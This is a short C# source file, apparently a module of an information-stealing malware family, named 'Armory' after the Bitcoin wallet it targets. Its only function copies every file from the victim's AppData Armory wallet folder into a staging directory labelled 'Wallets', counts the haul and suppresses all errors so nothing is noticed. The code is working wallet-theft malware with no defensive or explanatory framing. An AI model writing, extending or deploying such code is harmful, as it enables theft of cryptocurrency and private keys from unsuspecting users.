﻿using System;
using System.IO;

namespace youknowcaliber
{
	internal class Armory
	{
		public static void ArmoryStr(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppData + "\\Armory\\").GetFiles())
				{
					Directory.CreateDirectory(directorypath + Armory.ArmoryDir);
					fileInfo.CopyTo(directorypath + Armory.ArmoryDir + fileInfo.Name);
				}
				Armory.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		public static int count = 0;

		private static readonly string ArmoryDir = "\\Wallets\\Armory\\";
	}
}
